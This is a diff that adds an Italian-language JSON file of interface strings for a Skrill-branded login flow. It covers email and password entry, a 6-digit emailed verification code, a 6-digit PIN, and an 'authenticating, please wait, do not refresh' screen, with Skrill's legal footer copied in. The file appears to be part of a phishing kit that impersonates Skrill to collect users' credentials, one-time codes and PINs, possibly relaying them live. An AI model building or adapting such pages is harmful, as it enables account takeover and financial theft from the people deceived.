@@ -1,0 +1,48 @@
+{
+"main":{
+    "title":"Accedi al tuo conto Skrill",
+    "dont":"Non sei ancora registrato? ",
+    "register":"Registrati",
+    "email":"Email",
+    "pass":"Password",
+    "button":"Accedi",
+    "forgot":"Hai dimenticato la password?"
+},
+
+"email":{
+    "auth":"Autenticazione",
+    "step":"Fase 1 di 2",
+    "title":"Verifica la tua casella email",
+    "p1":"Un codice di verifica a 6 cifre è stato inviato a",
+    "p2":" Inseriscilo qui sotto.",
+    "label":"Codice di verifica *",
+    "time1":"Il tuo codice di verifica sarà attivo per ",
+    "time2":"minuti.",
+    "code":"Invia nuovo codice",
+    "button":"CONTINUA"
+},
+"pin":{
+    "step":"Fase 2 di 2",
+    "title":"Inserisci il tuo PIN",
+    "p1":"Inserisci il tuo PIN a 6 cifre per continuare con l'accesso, ",
+    "p2":"Di cosa si tratta?",
+    "forgot":"Non chiedermelo più su questo dispositivo",
+    "button":"ACCEDI",
+        "label":"PIN"
+        
+        
+},
+"wait":{
+    "title":"Autenticazione...",
+    "desc":"Attendi mentre proviamo a connetterti. Si prega di non aggiornare questa pagina. Questo potrebbe richiedere alcuni minuti."
+},
+"privace":{
+
+    "privacy":"Politica sulla Privacy | Informativa sui cookie | Impostazioni cookie",
+
+    "p":"Skrill Limited. Registrata in Inghilterra e Galles. Azienda con numero di registro: 4260907 Sede centrale: 27th Floor, 25 Canada Square, Canary Wharf, Londra, E14 5LQ, Regno Unito Skrill Limited (FRN: 900001) è autorizzata e regolamentata dalla Financial Conduct Authority secondo le Norme sulla moneta elettronica 2011 riguardanti l’emissione di moneta elettronica. Skrill è un marchio registrato di Skrill Limited."
+}
+}
+
+
+
